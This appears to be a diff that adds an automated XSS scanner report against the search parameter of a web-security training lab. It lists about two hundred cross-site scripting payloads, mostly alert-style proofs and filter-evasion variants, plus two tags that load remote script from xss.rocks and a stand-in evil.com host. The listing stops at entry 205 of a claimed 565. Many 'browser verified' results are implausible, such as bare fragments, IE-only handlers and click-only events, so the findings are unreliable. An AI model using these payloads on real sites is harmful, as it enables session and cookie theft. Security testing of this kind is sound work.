@@ -1,0 +1,2845 @@
+================================================================================
+                         XSScan Security Report
+================================================================================
+
+SCAN DETAILS
+------------
+Target URL: https://0af00003044a41c08073943500b8007c.web-security-academy.net/
+HTTP Method: GET
+Parameters Tested: search
+Total Payloads: 565
+Scan Start: 2026-01-02 15:51:39
+Scan End: 2026-01-02 15:57:08
+Duration: 5m29s
+Browser Verification: true
+
+RESULTS SUMMARY
+---------------
+RAW XSS Found: 560
+Browser Verified: 556
+Escaped Reflections: 4
+
+RISK ASSESSMENT
+---------------
+Severity: CRITICAL
+The application is vulnerable to XSS attacks. Browser verification confirmed that
+malicious scripts can be executed in the user's browser.
+
+VULNERABILITIES FOUND
+---------------------
+
+[1] Parameter: search
+    Payload: <script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[2] Parameter: search
+    Payload: <script>alert('XSS')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[3] Parameter: search
+    Payload: <script>alert("XSS")</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[4] Parameter: search
+    Payload: <script>prompt(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[5] Parameter: search
+    Payload: <script>confirm(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[6] Parameter: search
+    Payload: <script>alert(document.cookie)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[7] Parameter: search
+    Payload: <script>alert(document.domain)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[8] Parameter: search
+    Payload: <script>alert(window.origin)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[9] Parameter: search
+    Payload: <script src=//xss.rocks/xss.js></script>
+    Status: RAW REFLECTION (Static Analysis)
+    Severity: HIGH
+
+[10] Parameter: search
+    Payload: <script src=https://evil.com/xss.js></script>
+    Status: RAW REFLECTION (Static Analysis)
+    Severity: HIGH
+
+[11] Parameter: search
+    Payload: <svg/onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[12] Parameter: search
+    Payload: <svg onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[13] Parameter: search
+    Payload: <svg><script>alert(1)</script></svg>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[14] Parameter: search
+    Payload: <svg><animate onbegin=alert(1) attributeName=x dur=1s>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[15] Parameter: search
+    Payload: <svg/onload=alert(String.fromCharCode(88,83,83))>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[16] Parameter: search
+    Payload: <svg onload=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[17] Parameter: search
+    Payload: <svg onload=confirm(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[18] Parameter: search
+    Payload: <svg onload=alert`1`>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[19] Parameter: search
+    Payload: <svg onload=eval(atob('YWxlcnQoMSk='))>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[20] Parameter: search
+    Payload: <svg><script>alert&#40;1&#41;</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[21] Parameter: search
+    Payload: <img src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[22] Parameter: search
+    Payload: <img src=x onerror=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[23] Parameter: search
+    Payload: <img src=x onerror=confirm(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[24] Parameter: search
+    Payload: <img src=x onerror=alert('XSS')>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[25] Parameter: search
+    Payload: <img src=x onerror=alert`1`>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[26] Parameter: search
+    Payload: <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[27] Parameter: search
+    Payload: <img src=x onerror=alert(document.cookie)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[28] Parameter: search
+    Payload: <img/src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[29] Parameter: search
+    Payload: <img src="x" onerror="alert(1)">
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[30] Parameter: search
+    Payload: <img src='x' onerror='alert(1)'>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[31] Parameter: search
+    Payload: <body onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[32] Parameter: search
+    Payload: <body onpageshow=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[33] Parameter: search
+    Payload: <body onfocus=alert(1)>
+    Status: RAW REFLECTION (Static Analysis)
+    Severity: HIGH
+
+[34] Parameter: search
+    Payload: <body onhashchange=alert(1)>
+    Status: RAW REFLECTION (Static Analysis)
+    Severity: HIGH
+
+[35] Parameter: search
+    Payload: <body onload=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[36] Parameter: search
+    Payload: <body onload=confirm(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[37] Parameter: search
+    Payload: <input onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[38] Parameter: search
+    Payload: <input onblur=alert(1) autofocus><input>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[39] Parameter: search
+    Payload: <input type=text value=x onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[40] Parameter: search
+    Payload: <input type=button value=xss onclick=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[41] Parameter: search
+    Payload: <input type=image src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[42] Parameter: search
+    Payload: <iframe src=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[43] Parameter: search
+    Payload: <iframe src="javascript:alert(1)">
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[44] Parameter: search
+    Payload: <iframe onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[45] Parameter: search
+    Payload: <iframe/onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[46] Parameter: search
+    Payload: <iframe src="data:text/html,<script>alert(1)</script>">
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[47] Parameter: search
+    Payload: '-alert(1)-'
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[48] Parameter: search
+    Payload: <details open ontoggle=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[49] Parameter: search
+    Payload: <details ontoggle=alert(1)><summary>xss</summary></details>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[50] Parameter: search
+    Payload: <details open ontoggle=prompt(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[51] Parameter: search
+    Payload: <object data=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[52] Parameter: search
+    Payload: <embed src=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[53] Parameter: search
+    Payload: <object data="data:text/html,<script>alert(1)</script>">
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[54] Parameter: search
+    Payload: <select onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[55] Parameter: search
+    Payload: <textarea onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[56] Parameter: search
+    Payload: <keygen onfocus=alert(1) autofocus>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[57] Parameter: search
+    Payload: <marquee onstart=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[58] Parameter: search
+    Payload: <marquee loop=1 onfinish=alert(1)>x</marquee>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[59] Parameter: search
+    Payload: <video src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[60] Parameter: search
+    Payload: <audio src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[61] Parameter: search
+    Payload: <video><source onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[62] Parameter: search
+    Payload: <link rel=stylesheet href=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[63] Parameter: search
+    Payload: <a href=javascript:alert(1)>click</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[64] Parameter: search
+    Payload: <a href="javascript:alert(1)">click</a>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[65] Parameter: search
+    Payload: <form action=javascript:alert(1)><input type=submit>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[66] Parameter: search
+    Payload: <form><button formaction=javascript:alert(1)>X</button>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[67] Parameter: search
+    Payload: <form><input formaction=javascript:alert(1) type=submit value=X>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[68] Parameter: search
+    Payload: <meta http-equiv=refresh content=0;url=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[69] Parameter: search
+    Payload: <meta http-equiv=refresh content="0;javascript:alert(1)">
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[70] Parameter: search
+    Payload: <style>*{background:url('javascript:alert(1)')}</style>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[71] Parameter: search
+    Payload: <style>@import'javascript:alert(1)';</style>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[72] Parameter: search
+    Payload: <style onload=alert(1)></style>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[73] Parameter: search
+    Payload: <math><mi xlink:href=javascript:alert(1)>X</mi></math>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[74] Parameter: search
+    Payload: <table background=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[75] Parameter: search
+    Payload: <table><td background=javascript:alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[76] Parameter: search
+    Payload: <div onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[77] Parameter: search
+    Payload: <div style=width:expression(alert(1))>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[78] Parameter: search
+    Payload: <script>alert&#40;1&#41;</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[79] Parameter: search
+    Payload: <script>alert&#x28;1&#x29;</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[80] Parameter: search
+    Payload: <script>\u0061lert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[81] Parameter: search
+    Payload: <script>eval('\x61lert(1)')</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[82] Parameter: search
+    Payload: <img src=x onabort=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[83] Parameter: search
+    Payload: <img src=x onactivate=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[84] Parameter: search
+    Payload: <img src=x onafterprint=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[85] Parameter: search
+    Payload: <img src=x onafterupdate=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[86] Parameter: search
+    Payload: <img src=x onbeforeactivate=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[87] Parameter: search
+    Payload: <img src=x onbeforecopy=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[88] Parameter: search
+    Payload: <img src=x onbeforecut=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[89] Parameter: search
+    Payload: <img src=x onbeforedeactivate=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[90] Parameter: search
+    Payload: <img src=x onbeforeeditfocus=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[91] Parameter: search
+    Payload: <img src=x onbeforepaste=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[92] Parameter: search
+    Payload: <img src=x onbeforeprint=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[93] Parameter: search
+    Payload: <img src=x onbeforeunload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[94] Parameter: search
+    Payload: <img src=x onbeforeupdate=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[95] Parameter: search
+    Payload: <img src=x onblur=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[96] Parameter: search
+    Payload: <img src=x onbounce=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[97] Parameter: search
+    Payload: <img src=x oncellchange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[98] Parameter: search
+    Payload: <img src=x onchange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[99] Parameter: search
+    Payload: <img src=x onclick=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[100] Parameter: search
+    Payload: <img src=x oncontextmenu=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[101] Parameter: search
+    Payload: <img src=x oncontrolselect=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[102] Parameter: search
+    Payload: <img src=x oncopy=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[103] Parameter: search
+    Payload: <img src=x oncut=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[104] Parameter: search
+    Payload: <img src=x ondataavailable=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[105] Parameter: search
+    Payload: <img src=x ondatasetchanged=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[106] Parameter: search
+    Payload: <img src=x ondatasetcomplete=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[107] Parameter: search
+    Payload: <img src=x ondblclick=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[108] Parameter: search
+    Payload: <img src=x ondeactivate=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[109] Parameter: search
+    Payload: <img src=x ondrag=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[110] Parameter: search
+    Payload: <img src=x ondragend=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[111] Parameter: search
+    Payload: <img src=x ondragenter=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[112] Parameter: search
+    Payload: <img src=x ondragleave=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[113] Parameter: search
+    Payload: <img src=x ondragover=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[114] Parameter: search
+    Payload: <img src=x ondragstart=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[115] Parameter: search
+    Payload: <img src=x ondrop=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[116] Parameter: search
+    Payload: <img src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[117] Parameter: search
+    Payload: <img src=x onerrorupdate=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[118] Parameter: search
+    Payload: <img src=x onfilterchange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[119] Parameter: search
+    Payload: <img src=x onfinish=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[120] Parameter: search
+    Payload: <img src=x onfocus=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[121] Parameter: search
+    Payload: <img src=x onfocusin=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[122] Parameter: search
+    Payload: <img src=x onfocusout=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[123] Parameter: search
+    Payload: <img src=x onhelp=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[124] Parameter: search
+    Payload: <img src=x oninput=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[125] Parameter: search
+    Payload: <img src=x onkeydown=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[126] Parameter: search
+    Payload: <img src=x onkeypress=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[127] Parameter: search
+    Payload: <img src=x onkeyup=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[128] Parameter: search
+    Payload: <img src=x onlayoutcomplete=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[129] Parameter: search
+    Payload: <img src=x onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[130] Parameter: search
+    Payload: <img src=x onlosecapture=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[131] Parameter: search
+    Payload: <img src=x onmousedown=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[132] Parameter: search
+    Payload: <img src=x onmouseenter=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[133] Parameter: search
+    Payload: <img src=x onmouseleave=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[134] Parameter: search
+    Payload: <img src=x onmousemove=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[135] Parameter: search
+    Payload: <img src=x onmouseout=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[136] Parameter: search
+    Payload: <img src=x onmouseover=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[137] Parameter: search
+    Payload: <img src=x onmouseup=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[138] Parameter: search
+    Payload: <img src=x onmousewheel=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[139] Parameter: search
+    Payload: <img src=x onmove=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[140] Parameter: search
+    Payload: <img src=x onmoveend=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[141] Parameter: search
+    Payload: <img src=x onmovestart=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[142] Parameter: search
+    Payload: <img src=x onpaste=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[143] Parameter: search
+    Payload: <img src=x onpropertychange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[144] Parameter: search
+    Payload: <img src=x onreadystatechange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[145] Parameter: search
+    Payload: <img src=x onreset=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[146] Parameter: search
+    Payload: <img src=x onresize=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[147] Parameter: search
+    Payload: <img src=x onresizeend=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[148] Parameter: search
+    Payload: <img src=x onresizestart=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[149] Parameter: search
+    Payload: <img src=x onrowenter=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[150] Parameter: search
+    Payload: <img src=x onrowexit=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[151] Parameter: search
+    Payload: <img src=x onrowsdelete=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[152] Parameter: search
+    Payload: <img src=x onrowsinserted=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[153] Parameter: search
+    Payload: <img src=x onscroll=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[154] Parameter: search
+    Payload: <img src=x onselect=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[155] Parameter: search
+    Payload: <img src=x onselectionchange=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[156] Parameter: search
+    Payload: <img src=x onselectstart=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[157] Parameter: search
+    Payload: <img src=x onstart=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[158] Parameter: search
+    Payload: <img src=x onstop=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[159] Parameter: search
+    Payload: <img src=x onsubmit=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[160] Parameter: search
+    Payload: <img src=x onunload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[161] Parameter: search
+    Payload: javascript:alert(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[162] Parameter: search
+    Payload: javascript:alert('XSS')
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[163] Parameter: search
+    Payload: javascript:prompt(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[164] Parameter: search
+    Payload: javascript:confirm(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[165] Parameter: search
+    Payload: data:text/html,<script>alert(1)</script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[166] Parameter: search
+    Payload: data:text/html,<img src=x onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[167] Parameter: search
+    Payload: <q/oncut=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[168] Parameter: search
+    Payload: <q/onclick=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[169] Parameter: search
+    Payload: <q/ondrag=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[170] Parameter: search
+    Payload: <q/ondrop=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[171] Parameter: search
+    Payload: <q/onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[172] Parameter: search
+    Payload: <q/onfocus=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[173] Parameter: search
+    Payload: <q/oninput=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[174] Parameter: search
+    Payload: <q/onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[175] Parameter: search
+    Payload: <q/onmove=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[176] Parameter: search
+    Payload: <q/onpaste=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[177] Parameter: search
+    Payload: <q/onreset=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[178] Parameter: search
+    Payload: <q/onresize=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[179] Parameter: search
+    Payload: <q/onscroll=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[180] Parameter: search
+    Payload: <q/onselect=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[181] Parameter: search
+    Payload: <q/onstart=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[182] Parameter: search
+    Payload: <q/onstop=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[183] Parameter: search
+    Payload: <q/onsubmit=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[184] Parameter: search
+    Payload: <script>alert(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[185] Parameter: search
+    Payload: <img src=x onerror=alert(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[186] Parameter: search
+    Payload: <svg onload=alert(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[187] Parameter: search
+    Payload: <body onload=alert(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[188] Parameter: search
+    Payload: <script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[189] Parameter: search
+    Payload: alert(1)
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[190] Parameter: search
+    Payload: <img	src=x	onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[191] Parameter: search
+    Payload: <svg
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[192] Parameter: search
+    Payload: onload=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[193] Parameter: search
+    Payload: <ScRiPt>alert(1)</ScRiPt>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[194] Parameter: search
+    Payload: <sCrIpT>alert(1)</sCrIpT>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[195] Parameter: search
+    Payload: <SCRIPT>alert(1)</SCRIPT>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[196] Parameter: search
+    Payload: <IMG SRC=x ONERROR=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[197] Parameter: search
+    Payload: <ImG sRc=x OnErRoR=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[198] Parameter: search
+    Payload: <SVG ONLOAD=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[199] Parameter: search
+    Payload: <SvG oNlOaD=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[200] Parameter: search
+    Payload: < script >alert(1)< / script >
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[201] Parameter: search
+    Payload: < img src=x onerror=alert(1) >
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[202] Parameter: search
+    Payload: < svg onload=alert(1) >
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[203] Parameter: search
+    Payload: <scr<script>ipt>alert(1)</scr</script>ipt>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[204] Parameter: search
+    Payload: <<script>script>alert(1)<</script>/script>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
+[205] Parameter: search
+    Payload: <img src="x"onerror=alert(1)>
+    Status: VERIFIED (alert() executed in browser)
+    Severity: CRITICAL
+
